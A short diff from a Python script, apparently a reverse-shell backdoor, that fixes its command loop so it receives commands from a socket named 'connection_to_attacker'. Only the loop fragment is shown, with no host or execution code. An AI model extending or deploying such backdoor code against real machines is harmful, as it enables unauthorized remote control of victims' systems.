@@ -17,7 +17,7 @@ def reliable_send(data):
 def shell():
     print("Inside the shell functions")
     while True:
-        command = reliable_send()
+        command = reliable_recv()
         print("Command Recieved")
         if command == 'terminate':
            connection_to_attacker.close()
